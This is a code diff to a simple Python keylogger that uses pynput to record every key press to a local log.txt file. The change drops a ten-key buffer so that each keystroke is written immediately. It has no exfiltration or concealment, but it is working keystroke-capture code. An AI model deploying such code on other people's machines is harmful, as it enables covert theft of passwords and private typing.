@@ -3,8 +3,6 @@ from pynput.keyboard import Key, Listener
 from pathlib import Path
 
 # Global variables
-count = 0
-keys = []
 LOG_FILE_NAME = "log.txt"
 LOG_PATH = Path(LOG_FILE_NAME)
 
@@ -15,16 +13,8 @@ if not LOG_PATH.is_file():
 
 
 def on_press(key):
-    global keys, count
-
-    keys.append(key)
-    count += 1
     print('{0} pressed'.format(key))
-
-    if count >= 10:
-        count = 0
-        write_file(keys)
-        keys = []
+    write_file(key)
 
 
 def on_release(key):
@@ -33,14 +23,13 @@ def on_release(key):
         return False
 
 
-def write_file(keys):
+def write_file(key):
     with open(LOG_FILE_NAME, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
+        k = str(key).replace("'", "")
+        if k.find("space") > 0:
+            f.write('\n')
+        elif k.find("Key") == -1:
+            f.write(k)
 
 
 # Collect events until released
